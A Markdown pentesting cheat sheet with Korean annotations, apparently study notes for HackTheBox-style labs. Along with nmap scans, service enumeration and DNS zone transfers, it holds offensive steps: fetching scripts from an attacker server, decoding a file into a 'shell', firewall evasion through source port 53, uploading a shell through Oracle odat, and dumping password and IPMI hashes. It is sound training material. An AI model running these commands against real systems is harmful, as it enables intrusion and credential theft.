# Banner Graping
```bash
nc -nv <ip> <port>

curl -IL https://www.inlanefreight.com

whatweb --no-errors 10.10.10.0/24

ssl certificate

http://10.10.10.10/robots.txt

javascript source code
```
---
# File transfer
```bash
wget http://10.10.14.1:8000/linenum.sh

curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

scp linenum.sh user@remotehost:/tmp/linenum.sh

echo <base64 encoded file> | base64 -d > shell
```
---
# nmap
```bash
sudo nmap -sn -oA tnet -iL ip.list

sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping
```
- `-sn` : Disables port scanning.
- `-PE` : ICMP Echo requests(ping test)
-  `--disable-arp-ping` : 라우터 너머에 있는 호스트는 ARP로 도달 불가능하므로 ICMP/TCP 필요
---
# 방화벽 우회

```bash
sudo nmap -sV 10.129.22.22 -Pn -p53 -sU

sudo nmap -sV 10.129.22.22 -Pn -p53

sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53

ncat -nv -p 53 10.129.2.28 50000
```
- DNS는 TCP,UDP 둘다 53번 포트에서 작동하며, 크기에 따라서 사용이 달라진다.
- 내 IP 주소의 53번 포트에서 패킷을 전송하여 일부 방화벽에서는 53번 포트가 안전하다 생각해서 패킷을 통과시켜 주는 경우가 있는 것.
---
# Foot printing
## SSL certificate
<img width="969" height="759" alt="image" src="https://github.com/user-attachments/assets/9b03c318-cce6-4810-ab5d-0c70a0648c2b" />

```bash
curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
```

## FTP SSL certificate
```bash
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```
- nmap 스캔시 `AUTH TLS`가 보이면 SSL 연결 지원이라는 것을 확인할 수 있다.
- `ls -al`로 숨김 파일 체크
- 업로드 체크

## SMB rpc client
```bash
rpcclient -U '' -N 10.129.23.91

#rpcclient
querydominfo
netshareenumall
netsharegetinfo <share>
enumdomusers
queryuser <RID>
```
- `querydominfo` : Provides domain, server, and user information of deployed domains.
- `netshareenumall` : Enumerates all available shares.
- `netsharegetinfo <share>` : Provides information about a specific share.
- `enumdomusers` : Enumerates all domain users.
- `queryuser <RID>` : Provides information about a specific user.

## NFS(111,2049)
```bash
showmount -e <target>

sudo mount -t nfs 10.129.14.128:/target ./target/ -o nolock

sudo umount ./target
```

## DNS
```bash
dig inlanefreight.htb

# 역방향 조회
dig -x <ip>

dig ns inlanefreight.htb @10.129.14.128

dig CH TXT version.bind @10.129.120.85

dig any inlanefreight.htb @10.129.14.128

dig axfr <domain> @<dns server>

dig axfr @nsztm1.digi.ninja zonetransfer.me

dig axfr inlanefreight.htb @10.129.14.128

dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r

dnsenum --dnsserver 10.129.167.221 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt inlanefreight.htb
```
- nmap에서 DNS가 발견되면 사용
- DNS가 도서관 전체라면 ZONE은 각각의 주제들을 모아놓은 곳
- CNAME : 별칭

## VHOST(ffuf로 Host만 바꿔서 찾았던 것)
```bash
gobuster vhost -u http://<target_IP_address> -w <wordlist_file> --append-domain

gobuster vhost -u http://94.237.120.112:44025 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain --domain inlanefreight.htb

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.inlanefreight.htb' -u http://83.136.253.132:32685
```
- 80번 포트가 아니라면 vhost를 사용하더라도 port번호를 명시해줘야 함.(http://example.com:8443)

## SMTP
```bash 
smtp-user-enum -M VRFY -U footprinting-wordlist.txt -t 10.129.42.195 -w 20 -v
```
- some SMTP servers have higher response times.

## IMAP and POP3
```bash
openssl s_client -connect 10.129.14.128:pop3s

openssl s_client -connect 10.129.14.128:imaps
```
```bash
telnet <ip> 143

a LOGIN <id> <password>
a LIST "" *
a SELECT INBOX
a SEARCH ALL
a fetch <NUMBER> body[header]
a fetch <NUMBER> body[text]
a LOGOUT
```
- 메일박스를 선택할 때 대소문자 구별해서 선택해야 한다.

## SNMP(161)
```bash
snmpwalk -v2c -c public 10.129.14.128

snmpbulkwalk -c public -v2c 10.10.10.10 . > result

snmpbulkwalk -c <community strings> -v2c <ip> . > result

# Find Community Strings(SNMP의 비밀번호의 개념)
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
```
- `snmpbulkwalk`는 v2부터 사용할 수 있음.
- timeout이 걸리면 community string이 다를 수 있으니 onesixtyone으로 찾아보기

## MSSQL(1433)
```bash
# MSSQL default database
master
model
msdb
tempdb
resource
```

## Oracle TNS(1521 port)
```bash
sudo odat.py all -s 10.129.204.235

sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig

sqlplus scott/tiger@10.129.204.235/<oracle sid from nmap>

sqlplus scott/tiger@10.129.204.235/<oracle sid from nmap> as sysdba

# upload shell
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

##### in SQL
select table_name from all_tables;
select * from user_role_privs;
select name, password from sys.user$;
#####
```

## IPMI(623 UDP port)
```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

# metasploit
use auxiliary/scanner/ipmi/ipmi_version

use auxiliary/scanner/ipmi/ipmi_dumphashes
```

## RDP
- 특정 프로그램을 관리자 계정으로 실행 가능한지 테스트(cmd나 powershell도 확인)
---

# Information Gathering
- `/admin` : directory redeirecting
- `/admin/` : /admin/index 파일반환
## whois
```bash
whois <domain>
```

## Finger Printing
- Banner Grabbing
- Analysing HTTP Headers
- Probing for Specific Responses
- Analysing Page Content
```bash
curl -I inlanefreight.com

curl -I https://inlanefreight.com

curl -I https://www.inlanefreight.com

# detect firewall
wafw00f inlanefreight.com

nikto -h inlanefreight.com -Tuning b
```

## Well-Known URIs
```bash
https://example.com/.well-known/security.txt

https://example.com/.well-known/change-password

https://example.com/.well-known/openid-configuration
```

## Web Crawlers
```bash
pip3 install scrapy

python3 ReconSpider.py http://dev.web1337.inlanefreight.htb:41954
```

## Wayback Machine
- https://web.archive.org/

## finalrecon(not permmitted oscp)
```bash
./finalrecon.py --headers --whois --url http://inlanefreight.com
```
